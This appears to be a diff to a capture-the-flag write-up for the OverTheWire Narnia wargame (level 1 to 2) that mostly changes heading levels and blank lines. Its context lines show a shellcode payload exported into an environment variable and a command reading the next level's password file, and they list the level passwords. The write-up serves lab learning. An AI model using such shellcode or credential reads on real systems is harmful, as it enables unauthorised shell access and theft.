@@ -6,8 +6,7 @@
 
 **Password**: *efeidiedae*
 
-
-### Solution
+#### Solution
 
 * http://shell-storm.org/shellcode/files/shellcode-811.php
 
@@ -16,10 +15,8 @@ export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x
 cat /etc/narnia_pass/narnia2
 ```
 
-
 #### Credentials for Level 2
 
 **Username**: *narnia2*
 
 **Password**: *nairiepecu*
-
